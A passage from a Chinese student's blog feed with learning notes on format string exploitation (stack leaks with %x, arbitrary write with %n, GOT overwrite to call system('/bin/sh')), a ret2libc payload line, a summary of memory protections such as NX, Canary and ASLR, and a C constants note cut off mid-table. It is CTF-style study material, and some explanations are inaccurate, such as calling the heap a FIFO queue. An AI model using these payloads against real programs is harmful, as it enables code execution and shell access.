</p><p><strong>4SUN4_C8师傅的：</strong><br>思路就是覆盖got表并获取shell的流程是(以覆盖printf的got表为例):<br>1.确定printf的plt地址<br>2.通过泄露plt表中的指令内容确定对应的got表地址<br>3.通过泄露的got表地址泄露printf函数的地址<br>4.通过泄露的printf的函数地址确定libc基址，从而获得system地址<br>5.使用格式化字符串的任意写功能将printf的got表中的地址修改为system的地址<br>6.send字符串“/bin/sh;”，那么在调用printf(“/bin/sh;”)的时候实际上调用的是system(“/bin/sh;”)，从而成功获取shell<br><strong>参考资料：</strong><a href="http://bobao.360.cn/ctf/detail/189.html" title="格式化字符串blind pwn详细教程" target="_blank" rel="noopener">格式化字符串blind pwn详细教程</a>  </p><h2 id="自我总结"><a href="#自我总结" class="headerlink" title="自我总结"></a>自我总结</h2><p>我觉得学习了这个格式化字符串漏洞以后，感觉发现了一片新天地，只能说我觉得我一开始对二进制的理解是有错误的，而且这几天想了想，其实漏洞不会越修补越少，只会越修补越多，只是那些漏洞相对而言是以前没有发现过的，需要经过一个探索过程。<br>这一个学习阶段留下的坑实在是有点多，等我补写东西，再来填坑吧………………</p>]]></content>
    
    <summary type="html">
    
      好吧，纠正下上一次笔记，我错了，看来我到今天都还没学完printf的格式化字符串漏洞.................博大精深，遥不可及啊。
    
    </summary>
    
      <category term="漏洞" scheme="http://0xpoker.cuit.site/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="漏洞" scheme="http://0xpoker.cuit.site/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="格式化字符串" scheme="http://0xpoker.cuit.site/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串漏洞学习笔记(三)</title>
    <link href="http://0xpoker.cuit.site/20171127/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%89)/"/>
    <id>http://0xpoker.cuit.site/20171127/格式化字符串漏洞学习笔记(三)/</id>
    <published>2017-11-28T00:07:29.000Z</published>
    <updated>2017-12-01T18:18:35.975Z</updated>
    
    <content type="html"><![CDATA[<h1 id="格式化字符串漏洞学习笔记-三"><a href="#格式化字符串漏洞学习笔记-三" class="headerlink" title="格式化字符串漏洞学习笔记(三)"></a>格式化字符串漏洞学习笔记(三)</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个部分的相关知识快要完了，不过虽然知识没了，不过用起来却是灵活多变的，主要是用多种攻击手段的组合，来实现攻破的目的。所以，即使这个知识的知识点没了，但是还有其他的知识的，并不是没有需要学习的东西了。  </p><blockquote><p>还有一点，我回去又仔细看了下魔术公式，发现其实就是将需要写入的数据分段然后按指定的字节去输入再拼接。  </p></blockquote><h2 id="有binary但是格式化字符串不在栈中"><a href="#有binary但是格式化字符串不在栈中" class="headerlink" title="有binary但是格式化字符串不在栈中"></a>有binary但是格式化字符串不在栈中</h2><p>可能会有点疑问，不在栈上能在哪里呢？<br><strong>在堆上</strong>  </p><h3 id="什么是堆，什么是栈？"><a href="#什么是堆，什么是栈？" class="headerlink" title="什么是堆，什么是栈？"></a>什么是堆，什么是栈？</h3><p>堆栈是两种数据结构，两者都是一种数据项按序排列的数据结构。<br><strong>主要特点：堆，队列优先,先进先出（FIFO—first in first out）。栈，先进后出(FILO—First-In/Last-Out)。</strong><br><strong>参考资料：</strong><a href="https://baike.baidu.com/item/堆栈/1682032" title="堆栈介绍" target="_blank" rel="noopener">百度百科—-堆栈</a><br><a id="more"></a></p><h3 id="那具体该如何操作呢？"><a href="#那具体该如何操作呢？" class="headerlink" title="那具体该如何操作呢？"></a>那具体该如何操作呢？</h3><p>首先使用检查的插件对程序进行保护检测，用以确定该程序开启了什么防护<br>然后使用 <strong>%08x….</strong> 这类的格式化字符泄漏栈上内容大概确定一个栈的结构为什么样的。在确定这一块的栈大致分布着什么和分布在什么位置之后再进行下一步操作。<br>如果是那种开启了 <strong>NX</strong> 保护的程序，那我们就没法通过 <strong>直接写shellcode然后返回地址指向shellcode并执行shellcode</strong> 这种方法来攻击了。<br>这时候我们期待找到一个现成的 <strong>system(“/bin/sh”)</strong> 的地址，然后直接用return的地址指向他来获得shell，可这是理想化的，很多时候这种方法行不通。这时候就得引入一个东西名叫libc函数库。  </p><h4 id="什么是libc函数库？"><a href="#什么是libc函数库？" class="headerlink" title="什么是libc函数库？"></a>什么是libc函数库？</h4><p>libc是linux下C的标准函数库，它包含了C语言最基本的库函数。<br>libc函数库拥有不同的版本，每个版本有它 <strong>独特的特性</strong> ，我们也可以借助此特性找出他的版本。<strong>不同版本的libc里函数的偏移不同。</strong>  </p><h4 id="用什么来查询libc的版本呢？"><a href="#用什么来查询libc的版本呢？" class="headerlink" title="用什么来查询libc的版本呢？"></a>用什么来查询libc的版本呢？</h4><p>首先是泄露出libc相关的参数然后参考下面的操作。  </p><blockquote><p><strong>niklasb</strong> 的 <strong>libc-database</strong> 可以根据main函数返回<strong>libc_start_main函数的 <strong>返回地址的后12bit</strong> 来确定libc版本，需要下载这个软件并运行get文件来获得最新的libc-symbol库。libc-database的原理就是遍历db文件夹下所有libc文件的symbol并比对最后12bit来确定libc版本。除了所有libc库函数的调用地址外，还特别加入了</strong>libc_start_main_ret和“/bin/sh”字符串地址。当然，好像方法不止这一种，大家可以自行百度谷歌看看其他的方法。  </p></blockquote><p>在知道这些东西以后我们可以通过直接使用 <strong>现成的“/bin/sh”</strong> 或者<strong>自己构建</strong> 。<br>通常自己构建的话，形如：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = %<span class="number">11</span>$x+p32(system)+‘AAAA’+p32(binsh)</span><br></pre></td></tr></table></figure><p>解释下上面都是些什么意思吧，<br>先打印出偏移为11的栈存的值，然后是system的地址，<br>上述 <strong>AAAA</strong> 部分原本应该存放的是system函数的返回地址，可是我们做大部分题的时候调用完成之后不需要返回了，所以这里就自定义了4个字节。<br>最后是 <strong>/bin/sh</strong> 字符串，这里满足 <strong>call传参调用规则</strong> [先push然后进入call的时候往栈上放返回地址]<br>然后返回的时候会清理栈帧，这时候利用这一点，<strong>++(之前说过数据被存储在堆上)++</strong> 然后将栈上ebp的值覆盖为堆上相关的地址，这样一来，原本会执行如下这样的代码：  </p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov </span>esp,ebp</span><br><span class="line"><span class="keyword">pop </span>ebp</span><br></pre></td></tr></table></figure><p>现在执行之后，esp就会指向堆上的内容，这样就实现了堆栈互换，然后再操作堆和栈就基本一致了。<br>感觉头有点晕，什么地方写得不对的，改天再来改改吧，先去睡觉了！</p>]]></content>
    
    <summary type="html">
    
      我感觉我学到这里差不多应该把格式化字符串漏洞的相关内容学完了吧..............emmmmm，应该吧。
    
    </summary>
    
      <category term="漏洞" scheme="http://0xpoker.cuit.site/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="漏洞" scheme="http://0xpoker.cuit.site/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="格式化字符串" scheme="http://0xpoker.cuit.site/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串漏洞学习笔记(二)</title>
    <link href="http://0xpoker.cuit.site/20171126/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%8C)/"/>
    <id>http://0xpoker.cuit.site/20171126/格式化字符串漏洞学习笔记(二)/</id>
    <published>2017-11-27T01:23:56.000Z</published>
    <updated>2017-12-01T18:16:16.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="格式化字符串漏洞学习笔记-二"><a href="#格式化字符串漏洞学习笔记-二" class="headerlink" title="格式化字符串漏洞学习笔记(二)"></a>格式化字符串漏洞学习笔记(二)</h1><h2 id="利用格式化字符串漏洞构建任意读payload"><a href="#利用格式化字符串漏洞构建任意读payload" class="headerlink" title="利用格式化字符串漏洞构建任意读payload"></a>利用格式化字符串漏洞构建任意读payload</h2><p>该漏洞形如：  </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;a);</span><br><span class="line"><span class="built_in">printf</span>(&amp;a);</span><br></pre></td></tr></table></figure><p>在代码中我们可以直接看到我们可以通过输入格式化字符，来泄露栈上内容，同理，我们先输入某个值，用一长串 <strong>%08X.%08X.%08X……..</strong><br>来定位我们输入的值是放在哪里的，然后就可以利用 <strong>%s</strong> 对那个地址所指向的内容进行读取。<br>同时，还有个知识点，那就是不定参数的使用，比如： <strong>%10$08X</strong> 意为读取栈上 <strong>相对esp偏移量为10的参数 [形如%08X这样的默认是读偏移为1的参数]</strong> 同理， <strong>%s、%p、%n</strong> 都可以使用这个方法，用法相似。<br>挂一张与之相关的图吧，方便理解<br><img src="http://p9.qhimg.com/dr/__50/t0163bde2c444318577.png" alt="栈结构" title="栈的结构">  </p><blockquote><p><strong>用这个一般是泄漏地址，好像是libc函数库地址吧，这样好像可以推算出libc函数库的版本，然后加以利用。</strong>  </p></blockquote><h2 id="利用格式化字符串漏洞构建任意写payload"><a href="#利用格式化字符串漏洞构建任意写payload" class="headerlink" title="利用格式化字符串漏洞构建任意写payload"></a>利用格式化字符串漏洞构建任意写payload</h2><p>当然这个是建立在上一个知识点的基础上的，要是啥都不知道那不相当于乱写吗。<br><a id="more"></a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;a);</span><br><span class="line"><span class="built_in">printf</span>(&amp;a);</span><br></pre></td></tr></table></figure><p>代码格式还是不变吧……<br>printf在我们学习的过程中没有学过 <strong>%n</strong> 这些，而且我查百度百科也看到说现在的编译器一般是 <strong>默认禁掉了%n</strong> 但是这个printf任意写的漏洞依然是值得关注的。<br>而且printf任意写漏洞好像对printf家族都有效。在笔记(一)中有写到 <strong>%n的用法是将之前输出的内容长度写到某个地址上去</strong><br>假设我们先了解到了我们输入的内容是从栈上偏移11开始的，并且通过IDA我们找到了需要修改的相关地址。<br><strong>[这里假设地址为0x0804A02C]</strong><br>那就可以构建出如下payload：  </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x2c\xa0\x04\x08%<span class="number">11</span>$n</span><br></pre></td></tr></table></figure><p>那上面输入的东西是什么意思呢？<br>解释一下，就是最开始 <strong>以字符形式</strong> 输入地址，因为字符可能没法直接打出来所以用的形式就像这样，但是这个字符不是重点，重点是他对应的地址我们知道是放在栈上偏移为11的地方，这时候我们就 <strong>相当于把一个地址存进了栈里</strong>，然后 <strong>%11$n</strong> 就意为 <strong>将之前输出的字符数量存到栈上偏移量为11的那个地址指向的空间里</strong> 。就这样就实现了任意写。  </p><blockquote><p>在写入时还要考虑精简不然输出字符过多服务器连接就自己断开了<br>精简格式：比如我们要加入4个无关的填充字符，我们可以写成aaaa+”……”但是这样写在短的时候无所谓，长了之后，比如上千个，可能就不支持了或者时间太久了。<br>这时候就考虑两个方法，%[数值][c/x]来输出指定长度的字符串最后再利用%n来对指定的地址写入数据<br>同时在写入数据时也有讲究……<br>正如之前说的我们直接改4字节可能需要输出的字符串长度太长了，这时候就需要 <strong>%hn[两字节]、%hhn[一字节]</strong> 来控制写入的长度，与之相关还有 <strong>%lln</strong> 对应8字节，但是这个好像就用的不是很多了。</p></blockquote><h2 id="魔术公式"><a href="#魔术公式" class="headerlink" title="魔术公式"></a>魔术公式</h2><p>之前看讲解看到过，就是相当于将修改的值拼接在一起，只是在上述例子中还没用到而已，这里贴一张图吧。<br><img src="http://upload-images.jianshu.io/upload_images/2405665-7a4f10104bdb0662.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="魔术公式表" title="魔术公式表"></p><h2 id="相关学习连接"><a href="#相关学习连接" class="headerlink" title="相关学习连接"></a>相关学习连接</h2><p><a href="https://m.bobao.360.cn/learning/appdetail/3654.html" title="格式化字符串漏洞利用小结（一）" target="_blank" rel="noopener">格式化字符串漏洞利用小结（一）</a><br><a href="http://bobao.360.cn/learning/detail/3674.html" title="格式化字符串漏洞利用小结（一）" target="_blank" rel="noopener">格式化字符串漏洞利用小结（二）</a><br><a href="http://veritas501.space/2017/04/28/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" title="格式化字符串漏洞学习" target="_blank" rel="noopener">格式化字符串漏洞学习</a><br><a href="http://www.jianshu.com/p/f2acfeb66b6c" title="linux高级漏洞攻击" target="_blank" rel="noopener">linux高级漏洞攻击</a></p>]]></content>
    
    <summary type="html">
    
      实不相瞒，我感觉这个格式化字符加printf家族的成员可以搞好多事啊，不如叫printf家族作搞事家族算了。
    
    </summary>
    
      <category term="漏洞" scheme="http://0xpoker.cuit.site/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="漏洞" scheme="http://0xpoker.cuit.site/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="格式化字符串" scheme="http://0xpoker.cuit.site/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>保护技术-此文章长期更新</title>
    <link href="http://0xpoker.cuit.site/20171126/%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF-%E6%AD%A4%E6%96%87%E7%AB%A0%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0/"/>
    <id>http://0xpoker.cuit.site/20171126/保护技术-此文章长期更新/</id>
    <published>2017-11-26T17:02:50.000Z</published>
    <updated>2017-12-01T18:21:42.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="保护技术-此文章长期更新"><a href="#保护技术-此文章长期更新" class="headerlink" title="保护技术-此文章长期更新"></a>保护技术-此文章长期更新</h1><h2 id="NX保护和DEP保护"><a href="#NX保护和DEP保护" class="headerlink" title="NX保护和DEP保护"></a>NX保护和DEP保护</h2><p>两个保护措施都有相同点，都是使数据与代码分离，防止恶意代码被执行简单来说就是关闭了堆栈执行权限  </p><h3 id="NX保护"><a href="#NX保护" class="headerlink" title="NX保护"></a>NX保护</h3><p>NX保护，全称为 <strong>“No eXecute”</strong> ，意为 <strong>[禁止执行]</strong><br>我对它的理解即为栈上数据区域去除执行权限，就能防止大多数溢出攻击，即一些恶意程式，把自身的恶意指令集放在其他程式的数据储存区并执行。  </p><blockquote><p><strong>linux最早的漏洞防护机制nx-stack刚刚出现后就有人想出了突破方法。那就是只有栈是不可执行，而除了栈以外的其他地方还是可以执行的，只要把返回地址执行别的地方就可以。</strong></p></blockquote><p><strong>参考资料：</strong><a href="https://baike.baidu.com/item/NX/18775031" title="NX保护技术" target="_blank" rel="noopener">百度百科—-NX</a></p><h3 id="DEP保护"><a href="#DEP保护" class="headerlink" title="DEP保护"></a>DEP保护</h3><p>DEP保护，全称为 <strong>Data Execution Prevention</strong> ，意为 <strong>数据执行保护</strong>  </p><blockquote><p><strong>数据执行保护(DEP)</strong> 是一套软硬件技术，能够在内存上执行额外检查以帮助防止在系统上运行恶意代码</p></blockquote><h4 id="主要优点"><a href="#主要优点" class="headerlink" title="主要优点"></a>主要优点</h4><blockquote><p>我觉得这种保护技术组要应用于Windows</p></blockquote><a id="more"></a><p>这种技术的保护方式和NX方式有相同的地方，也就是让堆和堆栈上的内容不可执行。 <strong>可帮助防止数据页当作代码执行，从而有效分离数据与代码。</strong><br><strong>百度百科上有这样一句话：</strong>  </p><blockquote><p>可以说，溢出是操作系统(应用软件)永远的痛，Windows 7自然也不例外。所谓溢出主要指缓冲区溢出，就是利用系统(应用软件)漏洞从只有Windows和其他程序可以使用的内存位置执行恶意代码从而达到控制系统的目的。如前所述，缓冲区溢出攻击经常在其它程序的内存缓冲区写入可执行的恶意代码，然后诱骗程序执行恶意代码。使用DEP的目的是阻止恶意插入代码的执行，其运行机制是，Windows利用DEP标记只包含数据的内存位置为非可执行(NX)，当应用程序试图从标记为NX的内存位置执行代码时，Windows的DEP逻辑将阻止应用程序这样做，从而达到保护系统防止溢出。  </p></blockquote><p><strong>参考资料：</strong><a href="https://baike.baidu.com/item/DEP/7694630" title="DEP保护技术" target="_blank" rel="noopener">百度百科—-DEP</a></p><blockquote><p>好像这部分还分为硬件实施DEP和软件实施DEP，鉴于我才开始学习，这个坑先留着吧，过些日子理解之后我再来填</p></blockquote><h2 id="Linux-Canary保护"><a href="#Linux-Canary保护" class="headerlink" title="Linux Canary保护"></a>Linux Canary保护</h2><p><strong>Canary</strong> ，又名 <strong>金丝雀</strong> ，是一个防止溢出修改ret的措施， <strong>Canary</strong> 是Linux众多安全保护机制中的一种，主要用于 <strong>防护栈溢出攻击</strong> 。我们知道，在32位系统上，对于栈溢出漏洞，攻击者通常是通过 <strong>溢出栈缓冲区</strong> ， <strong>覆盖栈上保存的函数返回地址</strong> 来达到 <strong>劫持程序执行流</strong> 的目的：<br><img src="http://ww4.sinaimg.cn/large/0060lm7Tly1fly8rbuqe5j30fh08jwev.jpg" alt="溢出栈缓冲区" title="劫持方式"><br>如上图所示我们只要能够精确计算出需要覆盖的长度是多少，就能精确覆盖ret的地址，达到攻击效果。<br>然而，针对此种攻击情况，如果在函数返回之前，我们能够判断ret地址是否被改写，若被改写则终止程序的执行，便可以有效地应对攻击。如何做到呢？一个很自然的想法是在刚进入函数时，在栈上放置一个标志，在函数结束时，<strong>判断该标志是否被改变</strong>，如果被改变，则表示有攻击行为发生。 <strong>Linux Canary保护机制</strong> 便是如此，如下：<br><img src="http://ww2.sinaimg.cn/large/0060lm7Tly1fly8td94gdj30fh08pdg9.jpg" alt="Canary保护机制" title="Canary保护机制"><br>攻击者如果要通过栈溢出覆盖ret，则必先覆盖Canary。如果我们能判断Canary前后是否一致，便能够判断是否有攻击行为发生。  </p><blockquote><p><strong>注：上述图例仅用于说明，实际上canary并不一定是与栈上保存的BP地址相邻的。</strong><br><strong>参考资料：</strong><a href="https://www.cnblogs.com/gsharpsh00ter/p/6420233.html" title="Canary绕过之__stack_chk_fail劫持" target="_blank" rel="noopener">0ctf2015 flagen - Canary绕过之__stack_chk_fail劫持</a>  </p></blockquote><h2 id="ASLR地址空间布局随机化"><a href="#ASLR地址空间布局随机化" class="headerlink" title="ASLR地址空间布局随机化"></a>ASLR地址空间布局随机化</h2><p><strong>ASLR</strong> ，全称为 <strong>Address space layout randomization</strong><br>顾名思义，这个保护措施的主要内容就是把地址给随机化了，用以增加攻击者对地址预测的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的的一种技术。  </p><blockquote><p>但是在百度百科上也说了这个措施只是能降低缓冲区溢出攻击的成功率，并不是能完全防止溢出。  </p></blockquote><p>关于这个，多的我也说不上来，给几个文章的地址吧。<br><strong>参考资料：</strong><br><a href="http://blog.csdn.net/yygydjkthh/article/details/41794395" title="ASLR地址随机化" target="_blank" rel="noopener">ASLR(Address space layout randomization)地址空间布局随机化</a><br><a href="https://baike.baidu.com/item/aslr/5779647" title="百度百科--ASLR" target="_blank" rel="noopener">百度百科—-ASLR</a>  </p><h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><p><strong>PIE</strong> ，全称为 <strong>position-independent executables</strong><br>一般情况下NX和地址空间分布随机化会同时工作。在linux下内存空间随机化被称作PIE。</p><p>内存地址随机化机制，有以下三种情况：  </p><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:left">意义</th></tr></thead><tbody><tr><td style="text-align:center">0</td><td style="text-align:left">表示关闭进程地址空间随机化</td></tr><tr><td style="text-align:center">1</td><td style="text-align:left">表示将mmap的基址，stack和vdso页面随机化</td></tr><tr><td style="text-align:center">2</td><td style="text-align:left">表示在1的基础上增加栈（heap）的随机化</td></tr></tbody></table><blockquote><p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。<br><strong>Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。</strong>  </p></blockquote><h2 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h2><p>这个好像是编译器的保护措施，将函数名改变了，从而达到防止缓冲区溢出的作用。具体的坑emmm等我以后学会了些再来填吧。  </p><p>系统防护（全）：<br><a href="http://www.mamicode.com/info-detail-1990426.html" title="二进制的保护机制" target="_blank" rel="noopener">二进制的保护机制</a><br><a href="http://blog.csdn.net/x_nirvana/article/details/61420056" title="保护机制" target="_blank" rel="noopener">WINDOWS和LINUX的内存防护机制</a>  </p>]]></content>
    
    <summary type="html">
    
      这篇文章就用来汇总我看到过的和我后期学习看到的软件保护和系统保护技术吧，这些东西，记着总没错。
    
    </summary>
    
      <category term="漏洞" scheme="http://0xpoker.cuit.site/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="漏洞防护" scheme="http://0xpoker.cuit.site/tags/%E6%BC%8F%E6%B4%9E%E9%98%B2%E6%8A%A4/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串漏洞学习笔记(一)</title>
    <link href="http://0xpoker.cuit.site/20171126/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%80)/"/>
    <id>http://0xpoker.cuit.site/20171126/格式化字符串漏洞学习笔记(一)/</id>
    <published>2017-11-26T16:03:40.000Z</published>
    <updated>2017-12-01T18:12:38.712Z</updated>
    
    <content type="html"><![CDATA[<h1 id="格式化字符串漏洞学习笔记-一"><a href="#格式化字符串漏洞学习笔记-一" class="headerlink" title="格式化字符串漏洞学习笔记(一)"></a>格式化字符串漏洞学习笔记(一)</h1><h2 id="格式化字符串漏洞产生原因"><a href="#格式化字符串漏洞产生原因" class="headerlink" title="格式化字符串漏洞产生原因"></a>格式化字符串漏洞产生原因</h2><p><strong>该漏洞的产生主要是因为程序员偷懒</strong><br>格式化字符串漏洞在通用漏洞类型库 <strong>CWE</strong> 中的编号是 <strong>134</strong>，其解释为 <strong>“软件使用了格式化字符串作为参数，且该格式化字符串来自外部输入”</strong>。<br>下面举例说明下什么时候存在这样的漏洞什么时候没有  </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> str[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>,str);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>,str);</span><br></pre></td></tr></table></figure><p>在上述这个程序中就不存在这样的漏洞，也是正常学习者编程的方式，但是接下来这样就会出现漏洞<br><a id="more"></a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> str[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>,str);</span><br><span class="line"><span class="built_in">printf</span>(str)</span><br></pre></td></tr></table></figure><p>在上面这个程序中如果第一次输入的是如：“love”，那后来输出的一样是love，可是，如果我们输入如：<strong>%2$x</strong>，则输出<strong>偏移2处的16进制数据</strong>，在遇到 <strong>%开头的这类字符时</strong>，printf就会<strong>优先</strong>把他当成格式化字符去读取对应的数据甚至修改对应数据，从而达到利用格式化字符串漏洞的作用效果。  </p><h2 id="基本的格式化字符串参数"><a href="#基本的格式化字符串参数" class="headerlink" title="基本的格式化字符串参数"></a>基本的格式化字符串参数</h2><table><thead><tr><th style="text-align:center">符号</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:center">%c</td><td style="text-align:left">输出字符，配上%n可用于向指定地址写数据。</td></tr><tr><td style="text-align:center">%d</td><td style="text-align:left">输出十进制整数，配上%n可用于向指定地址写数据。</td></tr><tr><td style="text-align:center">%x</td><td style="text-align:left">输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</td></tr><tr><td style="text-align:center">%p</td><td style="text-align:left">输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</td></tr><tr><td style="text-align:center">%s</td><td style="text-align:left">输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</td></tr><tr><td style="text-align:center">%n</td><td style="text-align:left">将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100x10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。</td></tr></tbody></table><blockquote><p>注：<strong>%n</strong>是通过格式化字符串漏洞<strong>改变程序流程</strong>的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。</p></blockquote><h3 id="尾言"><a href="#尾言" class="headerlink" title="尾言"></a>尾言</h3><p>就先介绍这么多吧，本人也是才开始学习，晚上看完一些再继续写下一章吧。  </p>]]></content>
    
    <summary type="html">
    
      从今天开始重新学习格式化字符串了，这东西感觉挺厉害的呢，好像emmmm................反正感觉挺牛逼，要不来一起看看呢。
    
    </summary>
    
      <category term="漏洞" scheme="http://0xpoker.cuit.site/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="漏洞" scheme="http://0xpoker.cuit.site/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="格式化字符串" scheme="http://0xpoker.cuit.site/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>C语言笔记——常量与宏定义</title>
    <link href="http://0xpoker.cuit.site/20171124/C%E8%AF%AD%E8%A8%80%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%B8%B8%E9%87%8F%E4%B8%8E%E5%AE%8F%E5%AE%9A%E4%B9%89/"/>
    <id>http://0xpoker.cuit.site/20171124/C语言笔记——常量与宏定义/</id>
    <published>2017-11-24T23:06:54.000Z</published>
    <updated>2017-12-01T18:25:19.723Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言笔记——常量与宏定义"><a href="#C语言笔记——常量与宏定义" class="headerlink" title="C语言笔记——常量与宏定义"></a>C语言笔记——常量与宏定义</h1><h2 id="特殊要点"><a href="#特殊要点" class="headerlink" title="特殊要点"></a>特殊要点</h2><ul><li>字符串常量在声明的时候编译器会在其后加一个 <strong>/x00</strong> 空字符</li><li>有 <strong>#</strong> 开头的命令都称为预处理命令</li><li>变量代表的一个空间名字可以改变，而常量是一个确定的值，不能被改变</li></ul><h2 id="常量分类"><a href="#常量分类" class="headerlink" title="常量分类"></a>常量分类</h2><table><thead><tr><th style="text-align:center">类型</th><th style="text-align:left">示例或说明</th></tr></thead><tbody><tr><td style="text-align:center">整型常量</td><td style="text-align:left">如：520，1314，123</td></tr><tr><td style="text-align:center">实型常量</td><td style="text-align:left">如：3.14，1.23，8.97</td></tr><tr><td style="text-align:center">字符常量</td><td style="text-align:left">又分为：普通字符，转义字符</td></tr><tr><td style="text-align:center">字符串常量</td><td style="text-align:left">如：“Love”</td></tr><tr><td style="text-align:center">符号常量</td><td style="text-align:left">使用前必须先定义</td></tr></tbody></table><h2 id="如何定义符号常量"><a href="#如何定义符号常量" class="headerlink" title="如何定义符号常量"></a>如何定义符号常量</h2><p><strong>格式：#define [name]</strong></p><a id="more"></a><h2 id="常量标识符命名规则"><a href="#常量标识符命名规则" class="headerlink" title="常量标识符命名规则"></a>常量标识符命名规则</h2><p><strong>和变量命名基本一致</strong></p><h2 id="备用表——转义字符"><a href="#备用表——转义字符" class="headerlink" title="备用表——转义字符"></a>备用表——转义字符</h2><table><thead><tr><th style="text-align:center">转义字符</th><th style="text-align:center">意义</th><th style="text-align:center">ASCII码值（十进制）</th></tr></thead><tbody><tr><td style="text-align:center">\a</td><td style="text-align:center">响铃</td><td style="text-align:center">007</td></tr><tr><td style="text-align:center">\b</td><td style="text-align:center">退格</td><td style="text-align:center">008</td></tr><tr><td style="text-align:center">\f</td><td style="text-align:center">换页</td><td style="text-align:center">012</td></tr><tr><td style="text-align:center">\n</td><td style="text-align:center">换行</td><td style="text-align:center">010</td></tr><tr><td style="text-align:center">\r</td><td style="text-align:center">回车</td><td style="text-align:center">013</td></tr><tr><td style="text-align:center">\t</td><td style="text-align:center">水平制表</td><td style="text-align:center">009</td></tr><tr><td style="text-align:center">\v</td><td style="text-align:center">垂直制表</td><td 